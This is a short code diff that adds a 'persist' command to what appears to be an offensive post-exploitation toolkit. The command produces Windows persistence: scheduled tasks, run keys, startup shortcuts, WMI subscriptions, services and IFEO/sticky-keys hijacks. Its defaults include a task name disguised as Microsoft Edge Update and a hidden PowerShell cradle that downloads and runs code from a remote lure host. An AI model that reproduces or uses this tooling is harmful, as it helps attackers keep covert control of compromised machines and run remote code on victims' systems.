@@ -153,6 +153,37 @@ class AptCommands:
             raise SystemExit(str(exc.args[0])) from None
         print(json_dumps(out))
 
+    # ─── persistence ───
+
+
+    def cmd_persist(self) -> None:
+        from .persistence import KINDS, command
+
+        self._need(2, "persist <schtask|run-key|startup-lnk|wmi-sub|service|ifeo> --name N --payload C")
+        if self.pos[1] == "list":
+            text(json_dumps(list(KINDS.keys())))
+            return
+        try:
+            out = command(
+                self.pos[1],
+                name=str(
+                    self.flags.get(
+                        "name", "MicrosoftEdgeUpdateTaskMachineCore"
+                    )
+                ),
+                payload=str(
+                    self.flags.get(
+                        "payload", "powershell -w h -nop -c iex(iwr '{lure}/s')"
+                    )
+                ),
+                target=str(self.flags.get("target", "sethc")),
+            )
+        except KeyError as exc:
+            err("persist <schtask|run-key|startup-lnk|wmi-sub|service|ifeo> [--name N] [--payload C]")
+            text(json_dumps(list(KINDS.keys())))
+            raise SystemExit(1) from None
+        print(json_dumps(out))
+
     # ─── collection ───
 
 
